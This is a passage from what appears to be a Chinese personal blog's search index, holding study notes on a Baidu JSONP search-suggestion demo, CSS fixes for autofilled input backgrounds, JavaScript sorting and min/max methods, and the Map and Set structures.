class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//针对于cb回调：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明 回调函数 fn</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//针对于 callBack：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明 回调函数（与返回函数相对应，window.baidu对象的sug方法）</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">baidu</span> = &#123;</span><br><span class="line">    <span class="attr">sug</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">s</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是 主要代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> searchEle = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line">searchEle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">scriptFn</span>(<span class="variable language_">this</span>.<span class="property">value</span>, <span class="string">&#x27;fn&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scriptFn</span>(<span class="params">value, callBack</span>) &#123;</span><br><span class="line">    <span class="comment">// append()无法将字符串解析为dom节点，使用append添加节点，不能使用将script标签放入``反义字符串中</span></span><br><span class="line">    <span class="keyword">let</span> scriptEle = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    scriptEle.<span class="property">src</span> = <span class="string">&#x27;https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=&#x27;</span> + value + <span class="string">&#x27;&amp;cb=&#x27;</span> + callBack;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(scriptEle);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>console.log(data.s) 打印得到的数据：</p><p><img src="/posts/lian-xiang-sou-suo-zhi-bai-du-jsonp/3.webp" alt="联想搜索之百度jsonp-3"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将文本框默认背景重置为白色</title>
      <link href="/posts/jiang-wen-ben-kuang-mo-ren-bei-jing-chong-zhi-wei-bai-se/"/>
      <url>/posts/jiang-wen-ben-kuang-mo-ren-bei-jing-chong-zhi-wei-bai-se/</url>
      
        <content type="html"><![CDATA[<h2 id="关于autofill伪类的-兼容性："><a href="#关于autofill伪类的-兼容性：" class="headerlink" title="关于autofill伪类的 兼容性："></a>关于autofill伪类的 兼容性：</h2><p>在现代浏览器中，包括Chrome、Safari、Firefox等，都支持:autofill伪类，但在使用时必须加上浏览器前缀-webkit-，即:-webkit-autofill。</p><p>在旧版的浏览器中，可能不支持:autofill伪类，需要使用其他的hack方法来实现。同时，不同浏览器也可能对:-webkit-autofill的支持程度不同，需要根据实际情况来选择合适的hack方法。</p><p>经测试，貌似不用-webkit-autofill也可以。某些情境下可能需要使用 :-webkit-autofill伪类。具体情况，具体分析。【以下 方法中的 属性值 最好都加 “! important”，以绝后患！】</p><h3 id="方法一-box-shadow"><a href="#方法一-box-shadow" class="headerlink" title="方法一:box-shadow"></a>方法一:box-shadow</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>:-webkit-autofill &#123;</span><br><span class="line">    <span class="attribute">color</span>: transparent;</span><br><span class="line">    <span class="attribute">background-clip</span>: content-box;</span><br><span class="line">    <span class="attribute">background-color</span>: white;</span><br><span class="line">    <span class="attribute">caret-color</span>: black;</span><br><span class="line">    <span class="comment">/*光标设置为 黑色*/</span></span><br><span class="line"><span class="comment">/*上面根据具体情境 可选，box-shadow最重要！！*/</span></span><br><span class="line">-webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1000px</span> white inset <span class="meta">!important</span>;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1000px</span> white inset <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法二-webkit-text-fill-color-和-transition-background-color-5000s-ease-in-out-0s"><a href="#方法二-webkit-text-fill-color-和-transition-background-color-5000s-ease-in-out-0s" class="headerlink" title="方法二:-webkit-text-fill-color 和 transition: background-color 5000s ease-in-out 0s;"></a>方法二:-webkit-text-fill-color 和 transition: background-color 5000s ease-in-out 0s;</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="comment">/*必须为background-color属性(即便这里没有设置background-color)、或all 加上 过渡效果，不然不会生效！！*/</span></span><br><span class="line">-webkit-<span class="selector-tag">text</span>-<span class="attribute">fill</span>-<span class="attribute">color</span>: <span class="number">#333333</span> <span class="meta">!important</span>;</span><br><span class="line"><span class="attribute">transition</span>: background-color <span class="number">5000s</span> ease-in-out <span class="number">0s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法三-background-color-和-transition-background-color-5000s-ease-in-out-0s"><a href="#方法三-background-color-和-transition-background-color-5000s-ease-in-out-0s" class="headerlink" title="方法三:background-color 和 transition: background-color 5000s ease-in-out 0s;"></a>方法三:background-color 和 transition: background-color 5000s ease-in-out 0s;</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="comment">/*必须为background-color属性、或all 加上 过渡效果，不然不会生效！！*/</span></span><br><span class="line">  <span class="attribute">background-color</span>: white <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">transition</span>: background-color <span class="number">5000s</span> ease-in-out <span class="number">0s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="啰嗦一下："><a href="#啰嗦一下：" class="headerlink" title="啰嗦一下："></a>啰嗦一下：</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 三合一，遇到问题再调整 */</span></span><br><span class="line"><span class="selector-tag">input</span>:-webkit-autofill &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">30px</span> white inset <span class="meta">!important</span>;</span><br><span class="line">    -webkit-<span class="selector-tag">text</span>-<span class="attribute">fill</span>-<span class="attribute">color</span>: <span class="number">#333333</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: white <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">transition</span>: background-color <span class="number">5000s</span> ease-in-out <span class="number">0s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最值与排序</title>
      <link href="/posts/zui-zhi-yu-pai-xu/"/>
      <url>/posts/zui-zhi-yu-pai-xu/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">98</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">96</span>, <span class="number">102</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式一：Array.sort()升序</span></span><br><span class="line">arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123; </span><br><span class="line">     <span class="keyword">return</span> a - b;<span class="comment">//降序 是 b-a</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二：一般的 两层 for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="property">length</span>; j++) &#123;</span><br><span class="line">       <span class="keyword">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class="line">           temp = arr[i];</span><br><span class="line">         arr[i] = arr[j];</span><br><span class="line">           arr[j] = temp;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式三：冒泡排序，与 方式二 思路不同，不过也是 两层 for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="property">length</span> - <span class="number">1</span> + i; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            arr[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//题外：若不需要升、降序，只求一个最值，1层冒泡循环即可</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;<span class="comment">//最大值 在数组的 最右边</span></span><br><span class="line">        temp = arr[i];</span><br><span class="line">        arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">        arr[i + <span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下2种方式 只能求出 最值。没有升、降序！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式四：单层 for循环</span></span><br><span class="line"><span class="comment">//（很重要！由于两个自定义最值一开始就要参与比较。两个 最值必须 相等，且使用数组中的任一个元素进行赋值！！！）</span></span><br><span class="line"><span class="keyword">var</span> min = max = arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &gt; max) &#123;</span><br><span class="line">        max = arr[i];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">        min = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式五：Array.reduce()</span></span><br><span class="line"><span class="keyword">var</span> min = max = <span class="number">0</span>;</span><br><span class="line"> max = arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line"> &#125;);</span><br><span class="line"> min = arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Set与map</title>
      <link href="/posts/set-yu-map/"/>
      <url>/posts/set-yu-map/</url>
      
        <content type="html"><![CDATA[<h2 id="Map的数据结构："><a href="#Map的数据结构：" class="headerlink" title="Map的数据结构："></a>Map的数据结构：</h2><div class="tip cogs"><p>一组具有键值对的结构,注意参数顺序（key：value），key具有 唯一性 value可有可无，可重复</p></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写法1：</span></span><br><span class="line"><span class="keyword">var</span> m=<span class="keyword">new</span> <span class="title class_">Map</span>([[<span class="string">&#x27;Michael&#x27;</span>,<span class="number">95</span>],[<span class="string">&#x27;Bob&#x27;</span>,<span class="number">75</span>],[<span class="string">&#x27;Tracy&#x27;</span>,<span class="number">85</span>]]);</span><br><span class="line"><span class="comment">//写法2</span></span><br><span class="line"><span class="keyword">var</span> scoreList =[&#123;<span class="attr">name</span>:<span class="string">&#x27;Tim&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">score</span>:<span class="number">90</span>&#125;,</span><br><span class="line">                &#123;<span class="attr">name</span>:<span class="string">&#x27;Tony&#x27;</span>,<span class="attr">age</span>:<span class="number">17</span>,<span class="attr">score</span>:<span class="number">95</span>&#125;,</span><br><span class="line">                &#123;<span class="attr">name</span>:<span class="string">&#x27;Kevin&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">score</span>:<span class="number">91</span>&#125;];</span><br></pre></td></tr></table></figure><p>如上为map的数据结构用 二维数组 表示的键值对</p><h3 id="map结构常用方法："><a href="#map结构常用方法：" class="headerlink" title="map结构常用方法："></a>map结构常用方法：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">map.<span class="title function_">set</span>(key,value)----&gt;给map添加键值对元素，返回值类型为空类型</span><br><span class="line"><span class="keyword">var</span> m=<span class="keyword">new</span> <span class="title class_">Map</span>();<span class="comment">//添加空的Map</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="number">67</span>);<span class="comment">//添加新的key-value</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&quot;Bob&quot;</span>,<span class="number">59</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m)<span class="comment">// 结果 &#123; &#x27;Adam&#x27; =&gt; 67, &#x27;Bob&#x27; =&gt; 59 &#125;</span></span><br><span class="line"></span><br><span class="line">map.<span class="title function_">has</span>(key)---&gt;检查map是否含有key，返回值类型为boolean类型</span><br><span class="line"><span class="keyword">var</span> m=<span class="keyword">new</span> <span class="title class_">Map</span>();<span class="comment">//添加空的Map</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="number">67</span>);<span class="comment">//添加新的key-value</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&quot;Bob&quot;</span>,<span class="number">59</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">has</span>(<span class="string">&quot;Adam&quot;</span>))<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(key)----&gt;通过key删除元素</span><br><span class="line">map.<span class="title function_">set</span>(key,value)----&gt;给map添加键值对元素，返回值类型为空类型</span><br><span class="line"><span class="keyword">var</span> m=<span class="keyword">new</span> <span class="title class_">Map</span>();<span class="comment">//添加空的Map</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="number">67</span>);<span class="comment">//添加新的key-value</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&quot;Bob&quot;</span>,<span class="number">59</span>);</span><br><span class="line">m.<span class="title function_">delete</span>(<span class="string">&quot;Bob&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">has</span>(<span class="string">&quot;Bob&quot;</span>));<span class="comment">//undefined1234567</span></span><br></pre></td></tr></table></figure><h3 id="需要注意的"><a href="#需要注意的" class="headerlink" title="需要注意的:"></a>需要注意的:</h3><p>由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值覆盖：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m =<span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="number">67</span>);</span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;Adam&#x27;</span>,<span class="number">88</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="title function_">get</span>(<span class="string">&#x27;Adam&#x27;</span>));<span class="comment">// 88</span></span><br></pre></td></tr></table></figure><h3 id="map拓展："><a href="#map拓展：" class="headerlink" title="map拓展："></a>map拓展：</h3><p><img src="/posts/set-yu-map/map.webp" alt="map"><br><img src="/posts/set-yu-map/map-console.webp" alt="map-console"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// map的声明</span></span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">    <span class="comment">// map的赋值</span></span><br><span class="line">    map.<span class="title function_">set</span>(<span class="string">&#x27;路飞&#x27;</span>, <span class="number">20</span>);</span><br><span class="line">    map.<span class="title function_">set</span>(<span class="string">&#x27;索隆&#x27;</span>, <span class="number">21</span>);</span><br><span class="line">    map.<span class="title function_">set</span>(<span class="string">&#x27;山治&#x27;</span>, <span class="number">22</span>);</span><br><span class="line">    map.<span class="title function_">set</span>(<span class="string">&#x27;娜美&#x27;</span>, <span class="number">23</span>);</span><br><span class="line">    <span class="comment">// 输出map</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(map);</span><br><span class="line">    <span class="comment">// 输出map的value</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">&#x27;山治&#x27;</span>));</span><br><span class="line">    <span class="comment">// key不存在就是新增 key存在就是修改</span></span><br><span class="line">    map.<span class="title function_">set</span>(<span class="string">&#x27;山治&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">get</span>(<span class="string">&#x27;山治&#x27;</span>));</span><br><span class="line">    <span class="comment">// map遍历</span></span><br><span class="line">    <span class="comment">// 一个参数遍历的是value值</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;+++++++++++++++++++++++++&#x27;</span>);</span><br><span class="line">    map.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(element);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 第一个参数是value值 第二个参数值是key</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;+++++++++++++++++++++++++&#x27;</span>);</span><br><span class="line">    map.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(k + <span class="string">&#x27;==&gt;&#x27;</span> + v);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;+++++++++++++++++++++++++&#x27;</span>);</span><br><span class="line">    <span class="comment">// for of遍历出的是数组 然后读取数组元素的值拼接</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> array <span class="keyword">of</span> map) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(array[<span class="number">0</span>], <span class="string">&#x27;==&gt;&#x27;</span>, array[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Set的数据结构"><a href="#Set的数据结构" class="headerlink" title="Set的数据结构:"></a>Set的数据结构:</h2><div class="tip cogs"><p>Set和Map类似，也是一组key（唯一性）的集合，但不存储value。由于key不能重复，所以，在Set中，没有重复的key。</p></div><p>用代码表示Set的数据结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> set=&#123;<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>&#125;</span><br><span class="line">要创建一个<span class="title class_">Set</span>,需要提供一个<span class="title class_">Array</span>作为输入,或者直接创建一个空<span class="title class_">Set</span>：</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s1 =<span class="keyword">new</span> <span class="title class_">Set</span>();<span class="comment">// 空Set</span></span><br><span class="line"><span class="keyword">var</span> s2 =<span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">用于 数组去重:</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="string">&#x27;3&#x27;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s);<span class="comment">//&#123;1,2,3,&quot;3&quot;&#125;12</span></span><br></pre></td></tr></table></figure><h3 id="Set的常用方法"><a href="#Set的常用方法" class="headerlink" title="Set的常用方法"></a>Set的常用方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>.<span class="title function_">add</span>(key);----&gt;添加元素，参数为key,可以重复添加，但不会有效果：</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);<span class="comment">//初始化Set</span></span><br><span class="line"> s.<span class="title function_">add</span>(<span class="number">4</span>);</span><br><span class="line"> s.<span class="title function_">add</span>(<span class="number">4</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s);<span class="comment">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"><span class="title class_">Set</span>.<span class="title function_">has</span>(key)—&gt;判断<span class="title class_">Set</span>中是否有<span class="title function_">key</span>(元素)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="title function_">has</span>(<span class="number">4</span>));<span class="comment">//false</span></span><br><span class="line"><span class="title class_">Set</span>.<span class="title function_">delete</span>(key)—&gt;删除对应的key</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">s.<span class="title function_">delete</span>(<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s);<span class="comment">//&#123;1,2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="set拓展："><a href="#set拓展：" class="headerlink" title="set拓展："></a>set拓展：</h3><p><img src="/posts/set-yu-map/set.webp" alt="set"><br><img src="/posts/set-yu-map/set-console.webp" alt="set-console"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 声明一个集合</span></span><br><span class="line">    <span class="keyword">let</span> list = [<span class="string">&#x27;路飞&#x27;</span>, <span class="string">&#x27;索隆&#x27;</span>, <span class="string">&#x27;路飞&#x27;</span>];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(list);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(list.<span class="property">length</span>);</span><br><span class="line">    <span class="comment">// 声明一个array集合 可以储存重复的值</span></span><br><span class="line">    <span class="keyword">let</span> array = <span class="keyword">new</span> <span class="title class_">Array</span>(list);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(array);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title 